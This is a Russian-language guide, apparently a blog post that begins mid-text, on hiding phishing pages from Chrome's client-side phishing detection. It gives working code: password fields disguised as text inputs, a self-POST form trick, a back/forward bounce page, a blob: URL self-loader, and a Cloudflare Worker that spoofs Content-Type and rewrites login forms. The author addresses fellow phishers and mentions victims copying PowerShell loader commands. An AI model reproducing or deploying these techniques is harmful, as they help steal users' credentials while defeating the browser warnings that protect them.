<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Dotted+Songti+Square&display=swap">

<!-- Вместо type="password" -->
<input type="text" class="pwd-mask" name="pass" placeholder="Password"
  autocomplete="off" spellcheck="false">
```

Пользователь видит точки при вводе - как в обычном поле пароля. Chrome видит `type="text"` - никаких password-триггеров, никаких ESB-сканов.

Так же не забываем про `autocomplete="off"` - без него Chrome может попытаться предложить автозаполнение и обнаружить поле через autofill-эвристики.

Отлично. Теперь перейдем к обходу самого классификатора.

---

### Трюк #1: POST-форма на себя же - обход через HTTP method

В renderer-side classifier есть проверка в `CanPerformPhishingDetection()`:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_dom_utils.cc, строка 24
blink::WebDocumentLoader* document_loader = frame->GetDocumentLoader();
if (!document_loader || document_loader->HttpMethod().Ascii() != "GET") {
  return PhishingProcessStatus::kInvalidDomLoader;
}
```

В browser-side path (когда `kClientSideDetectionCopyFromSurface` включен):

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc, строка 908
if (entry && entry->GetHasPostData()) {
  FinishBrowserSideClassification(
      PhishingDetectorResult::INVALID_DOCUMENT_LOADER);
  return;
}
```

Оба пути пропускают страницы, загруженные через POST. Мы можем это использовать.

Идея: первый заход на страницу по GET - страница перехватывает submit всех форм, при POST-submit-е ставит метку в localStorage. Если при загрузке метка есть - значит, это POST-навигация, CSD не запустится, показываем фишинг. Если нет - создаем невидимую POST-форму и сабмитим.

```html
<script>
(function() {
  var POST_MARKER = '_csd_post';

  // --- Перехват submit-ов всех форм ---
  // Если юзер сам сабмитит POST-форму на текущую страницу  -
  // ставим метку, чтобы при следующей загрузке
  // не делать "само-пост" повторно.
  document.addEventListener('submit', function(e) {
    var form = e.target;
    if (form && form.method && form.method.toUpperCase() === 'POST') {
      try { localStorage.setItem(POST_MARKER, '1'); } catch(x) {}
    }
  }, true);  // capture phase - сработает до любого stopPropagation

  // --- Проверка при загрузке ---
  var wasPost = false;
  try { wasPost = !!localStorage.getItem(POST_MARKER); } catch(x) {}

  if (wasPost) {
    // Эта страница загружена через POST - CSD не запустится.
    // Убираем метку за собой.
    try { localStorage.removeItem(POST_MARKER); } catch(x) {}
    // Показываем фишинг - вставляем контент, вызываем рендер и т.д.
  } else {
    // Первый визит (GET).
    // Ставим метку и сабмитим POST-форму на себя.
    try { localStorage.setItem(POST_MARKER, '1'); } catch(x) {}
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = location.href;
    f.style.display = 'none';
    var i = document.createElement('input');
    i.type = 'hidden';
    i.name = 'token';
    i.value = Math.random().toString(36);
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  }
})();
</script>
```

Почему это работает корректно в обе стороны:

- Первый GET-визит - метки нет -> ставим метку -> self-POST. Пользователь видит быстрый flash
- POST-загрузка - метка есть -> убираем -> показываем фишинг. CSD пропускает
- Юзер сам сабмитит форму на странице - submit-перехватчик ставит метку -> при следующей загрузке срабатывает `wasPost` -> self-POST не происходит
- Обновление страницы (reload) - метки уже нет (убрали) -> self-POST сработает снова

Перехват через `addEventListener('submit', ..., true)` в capture phase гарантирует, что метка поставится даже если другой обработчик вызовет `stopPropagation()`.

Сервер должен отдавать один и тот же HTML на GET и POST. Chrome увидит POST-навигацию и вернет `INVALID_DOCUMENT_LOADER` вместо запуска классификатора.

Отлично. Идем дальше.

---

### Трюк #2: Редирект туда-обратно - forward/back bypass

Оба пути (renderer и browser-side) пропускают страницы, загруженные через session history navigation (forward/back):

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/content_phishing_classifier_delegate.cc, строка 447
if (last_main_frame_transition_ & ui::PAGE_TRANSITION_FORWARD_BACK) {
  // Skip loads from session history navigation.
  ...
  std::move(callback_).Run(
      mojom::PhishingDetectorResult::FORWARD_BACK_TRANSITION, std::nullopt);
  return;
}

// client_side_detection_host.cc, строка 897-901
if (entry &&
    (entry->GetTransitionType() & ui::PAGE_TRANSITION_FORWARD_BACK) != 0) {
  FinishBrowserSideClassification(
      PhishingDetectorResult::FORWARD_BACK_TRANSITION);
  return;
}
```

Идея: направляем юзера на промежуточный сайт, который мгновенно делает `history.back()`. Когда юзер "возвращается" на нашу страницу - это session-history navigation, и CSD ее пропускает.

Нам нужен промежуточный сайт, который принимает HTML в URL-параметре и выполняет JS. Для этого подойдет любой сайт с reflected HTML injection или open redirect, или просто второй подконтрольный домен.

Страница 1 - наш фишинг:

```html
<script>
(function() {
  // Проверяем тип навигации через Performance API
  var entries = performance.getEntriesByType('navigation');
  if (entries.length && entries[0].type != 'back_forward') {
    // Первый визит - перенаправляем на bounce-страницу
    location.href = 'https://back.aels-martin.workers.dev';
  }
})();
</script>
```

Обратим внимание: `performance.getEntriesByType('navigation')[0].type` возвращает `'back_forward'` именно при history navigation. Это тот же самый transition type, который CSD проверяет через `PAGE_TRANSITION_FORWARD_BACK`. Мы используем его, чтобы надежно отличить "возврат" от первого визита без опоры на sessionStorage.

Bounce-страница - любой URL, который отдает `<script>history.back()</script>`. Проще всего - Cloudflare Worker на отдельном субдомене. В примере выше это `back.aels-martin.workers.dev`.

Супер.

---

### Трюк #3: blob: URL - страница вне юрисдикции CSD

Это, пожалуй, самый интересный трюк. В Chromium есть `BlockedSchemeNavigationThrottle`, который блокирует renderer-initiated навигацию в top frame на `data:` и `filesystem:` схемы. Заметьте - только эти две.

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/content/browser/renderer_host/blocked_scheme_navigation_throttle.cc, строки 103-108
if (handle.IsInMainFrame() && handle.IsRendererInitiated() &&
    !handle.IsSameDocument() && !handle.IsHistory() &&
    (handle.GetURL().SchemeIs(url::kDataScheme) ||
     handle.GetURL().SchemeIs(url::kFileSystemScheme)) &&
    !base::FeatureList::IsEnabled(
        features::kAllowContentInitiatedDataUrlNavigations)) {
  // блокируем
}
```

`blob:` URL **отсутствует** в этом списке. Навигация top frame на `blob:` URL - **разрешена**, даже без клика пользователя, даже без user gesture.

При этом `blob:` - не HTTP и не HTTPS. CSD проверяет:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
if (!url_.SchemeIsHTTPOrHTTPS()) {
  DontClassifyForPhishing(NO_CLASSIFY_SCHEME_NOT_SUPPORTED);
}
```

`blob:https://evil.com/uuid` - схема `blob`, не `https`. CSD **не запустится**.

На любую страницу вставляем скрипт, который создает `blob:` URL с минимальным JS-loader-ом внутри. Loader фетчит ту же самую страницу по `location.href` исходного документа и выводит ее через `document.write()`. Блоб наследует origin от создателя, по-этому `fetch()` на тот же домен работает без CORS-проблем. Никаких отдельных файлов, никаких payload-ов - страница загружает сама себя.

Достаточно вставить этот блок в `<head>` любой страницы:

```html
<script>
if (location.protocol !== 'blob:') {
  // Мы на обычной https:// странице - редиректим на blob.
  // JS-loader внутри blob-а фетчит эту же страницу и пишет в document.
  var src = location.href;
  var code = '<!DOCTYPE html>'
    + '<html><head><meta charset="utf-8"></head><body>'
    + '<script>'
    + 'fetch("' + src + '")'
    + '.then(function(r){return r.text()})'
    + '.then(function(h){document.open();document.write(h);document.close()})'
    + '<\/script></body></html>';
  var b = new Blob([code], {type: 'text/html'});
  location.href = URL.createObjectURL(b);
}
</script>
```

Внутри blob-а `location.protocol` будет `'blob:'`, по-этому при загрузке через `document.write()` скрипт не сработает повторно - петля не образуется.

Что происходит:

```
1. Жертва открывает https://evil.com/login
   CSD: запускает preclassification
   Но страница навигирует на blob: мгновенно - visual capture не успевает

2. location.href = blob:...
   BlockedSchemeNavigationThrottle: blob: не в списке -> разрешено

3. blob:-страница загружается
   CSD: SchemeIsHTTPOrHTTPS() == false -> классификатор не запускается

4. fetch('https://evil.com/login') изнутри blob-а
   Работает - blob: наследует origin от создателя

5. document.write() выводит полный HTML страницы
   Скрипт не срабатывает повторно (location.protocol === 'blob:')
   URL в адресной строке: blob:https://evil.com/uuid
   CSD: не перезапускается (same-document операция)
```

Пушка-бомба. Пользователь видит полноценную фишинг-страницу, CSD не работает, все JS API доступны. Страница самодостаточна - никаких отдельных файлов.

Ограничения:
- Адресная строка показывает `blob:https://evil.com/uuid` - внимательный юзер может заметить
- `blob:` URL живет, пока жива страница-создатель. После навигации создатель уничтожается, но blob уже загружен в document - это нормально
- Safe Browsing URL blacklist проверяет origin. Если домен уже в blacklist - red screen может появиться еще на первом шаге. Но для свежего домена это не проблема
- `document.write()` не перезапускает CSD, т.к. это same-document операция. URL остается `blob:` - схема не меняется

Отлично.

---

### Трюк #4: Content-Type - самый лучший и удобный метод

CSD берет MIME type из **raw HTTP-заголовка** `Content-Type`, а не из результата content-type sniffing. Это ключевой момент.

В коде, когда создается `ShouldClassifyUrlRequest`, MIME извлекается так:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc, конструктор ShouldClassifyUrlRequest
if (response_head->headers) {
  response_head->headers->GetMimeType(&mime_type_);
}
```

`HttpResponseHeaders::GetMimeType()` парсит `Content-Type` header напрямую:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/net/http/http_response_headers.cc
std::optional<std::string> combined_value =
    GetNormalizedHeader("content-type");
```

А вот content-type sniffing (`net::SniffMimeType()`) обновляет другое поле - `response->mime_type` в `URLResponseHead.mojom`. CSD это поле не читает.

Далее сравнение:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
bool is_mime_type_unsupported =
    mime_type_ != "text/html" && mime_type_ != "application/xhtml+xml";
```

Только два значения. Все остальное - `NO_CLASSIFY_UNSUPPORTED_MIME_TYPE`.

Что это значит: если наш сервер отдает полноценную HTML-страницу, но с заголовком `Content-Type: image/svg+xml` - Chrome отрендерит ее как HTML (благодаря sniffing-у), но CSD не запустится.

Пример в nginx:

```nginx
location /landing {
  default_type image/svg+xml;
  alias /var/www/phishing/index.html;
}
```

Или в Express:

```javascript
app.get('/landing', (req, res) => {
  res.setHeader('Content-Type', 'image/svg+xml');
  res.sendFile(__dirname + '/phishing.html');
});
```

Chrome отрендерит HTML корректно (контент-сниффинг определит HTML), но CSD увидит `image/svg+xml` из raw header и пропустит классификацию.

Вот таблица Content-Type значений, которые обходят CSD, но при этом Chrome все равно отрендерит HTML страницу:

```
Content-Type                   CSD       Chrome рендеринг     Подходит?
------------------------------  --------  -------------------  ----------
text/html                      CLASSIFY  HTML                 Нет
image/svg+xml                  SKIP      HTML (сниффинг)      Да
text/xml                       SKIP      HTML (сниффинг)      Да
(пустой / нет заголовка)       SKIP      HTML (сниффинг)      Да
application/xhtml+xml          CLASSIFY  HTML                 Нет
```

Если мы используем Cloudflare - это можно сделать Worker-ом, не меняя сервер. Worker перехватывает ответ и делает все сразу - подменяет `Content-Type` и заменяет password-инпуты:

```javascript
// Cloudflare Worker: подмена Content-Type + замена password-инпутов
export default {
  async fetch(request) {
    const response = await fetch(request);
    const contentType = response.headers.get('content-type') || '';

    // Обрабатываем только text/html и xhtml -
    // именно эти два MIME CSD считает классифицируемыми.
    if (!/text\/html|application\/xhtml\+xml/i.test(contentType)) {
      return response;
    }

    // 1. Подменяем Content-Type на image/svg+xml
    const headers = new Headers(response.headers);
    const charset = contentType.match(/charset=([^;\s]+)/i);
    headers.set(
      'content-type',
      'image/svg+xml' + (charset ? '; charset=' + charset[1] : '')
    );

    // 2. Заменяем type="password" на type="text" с маскирующим шрифтом
    let html = await response.text();

    // Внедряем шрифт-точки и стиль перед </head>
    const patchCSS = `
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Dotted+Songti+Square&display=swap">
<style>
  .pwd-mask { font-family: 'Dotted Songti Square', serif; -webkit-text-security: disc; letter-spacing: 2px; }
</style>`;
    html = html.replace(/(<\/head>)/i, patchCSS + '$1');

    // Заменяем все input type="password" на type="text" class="pwd-mask"
    html = html.replace(
      /(<input\b[^>]*?)\btype\s*=\s*["']password["']([^>]*?>)/gi,
      '$1type="text" class="pwd-mask" autocomplete="off" spellcheck="false"$2'
    );

    return new Response(html, {
      status: response.status,
      statusText: response.statusText,
      headers
    });
  }
};
```

Привязываем Worker к route в dashboard Cloudflare - и все HTML-ответы на этом route получают два изменения:
- `Content-Type: image/svg+xml` - CSD пропускает классификацию
- все `<input type="password">` заменены на `<input type="text" class="pwd-mask">` с подключенным шрифтом-точками

Chrome отрендерит HTML через сниффинг, пользователь увидит точки при вводе пароля, но для Chrome это обычное текстовое поле на странице с не-HTML MIME type. Никаких триггеров.

Это самый простой метод - один Worker решает сразу две задачи (обход CSD + замена password-инпутов), не требует JS на странице и не меняет URL в адресной строке.

Vio-la ¯\_(ツ)_/¯.

Важно: это не обходит Safe Browsing URL blacklist. Если наш URL уже в черном списке - red screen появится не зависимо от Content-Type. Это обходит только on-device CSD preclassification.

---

### Остатки мыслей вслух

**1. Enhanced Protection = больше триггеров.**

Keyboard lock, vibration, pointer lock, fullscreen, notification permission, clipboard copy - все это триггерит classification заново только для ESB-юзеров. Если наша страница не использует эти API - для ESB-юзера остается только стандартный page-load trigger.

**2. Clipboard: разбивайте команды.**

Если наш phishing требует, чтобы жертва скопировала команду (PowerShell loader и т.д.), помните о не полной (относительно windows bash) нормализации токенов.

**4. Экспериментальный browser-side path.**

Существует `kClientSideDetectionCopyFromSurface` - альтернативный путь, который берет screenshot через browser `CopyFromSurface()` вместо renderer-side paint preview. В этом случае:
- capture ждет `window.load`
- capture ждет visibility == VISIBLE (tab не скрыт)
- максимальный размер: 4096x2160

Он пока disabled по-умолчанию. Когда Chrome его включит в одном из новых релизов, renderer-side обходы перестанут работать.

---

### Почитать для общего развития

- Хороший обзор архитектуры Safe Browsing (хоть и устаревший): chromium.org/developers/design-documents/safebrowsing
- https://telegra.ph/Getting-rid-of-Google-Safebrowsing-red-screen-once-and-forever-Step-by-step-02-18 - моя предыдущая и уже устаревшая статья.
- Исходники CSD host: https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
- Исходники visual extractor: https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc
- Feature flags CSD: https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/common/features.cc
- Chromium Code Search: source.chromium.org - поиск по `ClientSideDetectionHost`, `PhishingVisualFeatureExtractor`, `ShouldClassifyUrlRequest`

Из этих файлов можно узнать текущие пороги, таймауты и feature flags - полезняшка.

---

### Финал

И да избавит Ктулху нас и наших пользователей от красных экранов.

Профита нам. До встреч.
